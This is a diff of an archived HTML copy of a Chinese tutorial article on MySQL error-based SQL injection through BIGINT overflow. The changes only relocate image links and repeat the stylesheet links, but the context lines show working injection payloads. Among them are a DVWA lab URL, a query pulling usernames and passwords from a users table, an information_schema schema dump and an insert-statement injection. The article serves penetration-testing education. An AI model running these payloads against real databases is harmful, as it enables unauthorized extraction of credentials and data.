@@ -3,7 +3,7 @@
 			<head>
 			     <title>基于BIGINT溢出错误的SQL注入 - mssp299</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></h1>
 				
@@ -18,7 +18,7 @@
 
 <p>我对于通过MySQL错误提取数据的新技术非常感兴趣，而本文中要介绍的就是这样一种技术。当我考察MySQL的整数处理方式的时候，突然对如何使其发生溢出产生了浓厚的兴趣。下面，我们来看看MySQL是如何存储整数的。</p>
 
-<p><img src="http://static.wooyun.org//drops/20150814/2015081407574396355.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015081407574396355.png" alt="enter image description here"></p>
 
 <!--more-->
 
@@ -118,7 +118,7 @@ ERROR 1690 (22003): BIGINT value is out of range in '((not((select <a class="__c
 
 <p>&lt;http://localhost/dvwa/vulnerabilities/sqli/?id=1' or !(select*from(select user())x)-~0&#45;- -|&amp;Submit=Submit#></p>
 
-<p><img src="http://static.wooyun.org//drops/20150814/2015081407574325818.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015081407574325818.png" alt="enter image description here"></p>
 
 <p>利用这种基于BIGINT溢出错误的注入手法，我们可以几乎可以使用MySQL中所有的数学函数，因为它们也可以进行取反，具体用法如下所示：</p>
 
@@ -163,7 +163,7 @@ SIGN
 <pre><code>!(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150814/2015081407574392122.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015081407574392122.png" alt="enter image description here"></p>
 
 <h1>0x004 一次性转储</h1>
 
@@ -176,11 +176,11 @@ SIGN
 (select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150814/2015081407574340135.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015081407574340135.png" alt="enter image description here"></p>
 
 <p>这些限制了我们可以检索的结果的数量，即最多27个。假设，我们在一个数据库中创建了一个31列的数据表。 那么，我们只能看到27个结果，而我的其他4个表和该用户数据表的其他列都无法返回。</p>
 
-<p><img src="http://static.wooyun.org//drops/20150814/2015081407574465036.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015081407574465036.png" alt="enter image description here"></p>
 
 <h1>0x05 利用插入语句进行注入</h1>
 
@@ -201,7 +201,7 @@ newdb::users::username
 newdb::users::password' from dual))) - ~(0))'
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150814/2015081407574438324.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015081407574438324.png" alt="enter image description here"></p>
 
 <h1>0x06 利用更新语句进行注入</h1>
 
@@ -270,7 +270,7 @@ if(isset($_GET['Submit'])){
 
 <p>&lt;http://localhost/dvwa/vulnerabilities/sqli/?id=!(select*from(select user())a)-0^222 &amp;Submit=Submit#></p>
 
-<p><img src="http://static.wooyun.org//drops/20150814/2015081407574445783.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015081407574445783.png" alt="enter image description here"></p>
 
 <p>我希望本文对大家的渗透测试工作能够有所帮助。</p>
 
